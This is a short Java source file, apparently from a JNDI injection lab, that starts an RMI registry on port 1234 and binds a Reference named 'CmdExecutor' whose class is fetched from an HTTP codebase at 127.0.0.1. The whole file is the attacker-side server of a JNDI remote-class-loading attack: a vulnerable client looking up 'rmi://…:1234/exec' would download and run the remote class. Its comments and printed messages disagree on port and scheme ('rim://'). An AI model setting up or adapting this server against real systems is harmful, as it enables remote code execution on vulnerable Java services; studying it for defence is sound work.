package service;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import java.rmi.registry.LocateRegistry;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.Reference;
import javax.naming.spi.ObjectFactory;
import java.rmi.registry.Registry;
import java.util.Arrays;
import java.util.Hashtable;
import java.util.Random;


public class Server{
    public void start(int port) throws Exception{
        // 创建一个注册中心，以1099作为端口
        Registry registry = LocateRegistry.createRegistry(port);

        Reference executorRef  = new Reference("CmdExecutor", "CmdExecutor", "http://127.0.0.1/class/");

        ReferenceWrapper refObjWrapper = new ReferenceWrapper(executorRef);

        // 将Executor类绑定到 rmi://127.0.0.1:1099/exec 上
        System.out.print("Binding 'refObjWrapper' to 'rim://127.0.0.1:1234/'... ");
        registry.bind("exec", refObjWrapper);
        System.out.println("Successful");
        System.out.println(Arrays.toString(registry.list()));
    }

    public void start() throws Exception{
        int port = 1024 + new Random().nextInt(65536-1024);
        start(port);
    }

    public static void main(String[] args) throws Exception {
        new Server().start(1234);
    }
}